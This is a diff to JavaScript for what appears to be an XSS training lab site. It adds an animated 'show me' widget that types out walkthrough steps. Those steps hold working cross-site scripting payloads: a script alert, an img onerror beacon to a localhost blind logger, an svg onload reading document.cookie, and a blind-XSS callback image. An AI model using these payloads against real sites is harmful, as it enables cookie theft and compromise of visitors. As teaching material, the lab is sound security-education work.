@@ -39,6 +39,8 @@ document.addEventListener('DOMContentLoaded', ()=>{
     }, 2200);
   };
 
+  const sleep = (ms = 0) => new Promise(resolve => setTimeout(resolve, ms));
+
   const goToPage = (page)=>{
     const params = new URLSearchParams(window.location.search);
     params.set('page', page);
@@ -1176,6 +1178,53 @@ document.addEventListener('DOMContentLoaded', ()=>{
     };
 
     shell._speedrunRefresh();
+  });
+
+  const showMeScripts = {
+    'home-fast-track': [
+      `1. Reflected lab → load ?page=reflected&q=%3Cscript%3Ealert(1)%3C/script%3E to prove the sink executes instantly.`,
+      `2. Stored lab → drop <img src=x onerror=fetch("//localhost/blind_logger.php?p=rat")> into the message body so every visit pings you.`,
+      `3. DOM lab → change the URL hash to #%3Csvg/onload=alert(document.cookie)%3E to hijack the client-side widget.`,
+      `4. Blind XSS logger → submit ?page=blind&payload=%3Cimg%20src=//localhost/blind_logger.php?p=ratlab%3E then watch callbacks.`
+    ]
+  };
+
+  document.querySelectorAll('[data-show-me-shell]').forEach(shell => {
+    const trigger = shell.querySelector('[data-show-me-trigger]');
+    const output = shell.querySelector('[data-show-me-output]');
+    const scriptId = shell.dataset.showMeScript || trigger?.dataset.showMeScript;
+    if (!trigger || !output || !scriptId || !showMeScripts[scriptId]){
+      shell.removeAttribute('data-show-me-shell');
+      return;
+    }
+    let isPlaying = false;
+    const typeLine = async (lineEl, text) => {
+      lineEl.textContent = '';
+      for (let i = 0; i < text.length; i += 1){
+        lineEl.textContent += text.charAt(i);
+        await sleep(22 + Math.random() * 18);
+      }
+    };
+    trigger.addEventListener('click', async ()=>{
+      if (isPlaying){
+        return;
+      }
+      isPlaying = true;
+      trigger.disabled = true;
+      shell.classList.add('is-playing');
+      output.innerHTML = '';
+      const script = showMeScripts[scriptId];
+      for (const line of script){
+        const lineEl = document.createElement('div');
+        lineEl.className = 'show-me-line';
+        output.appendChild(lineEl);
+        await typeLine(lineEl, line);
+        await sleep(260);
+      }
+      shell.classList.remove('is-playing');
+      trigger.disabled = false;
+      isPlaying = false;
+    });
   });
 
   document.querySelectorAll('[data-fundamentals-playground]').forEach(playground => {
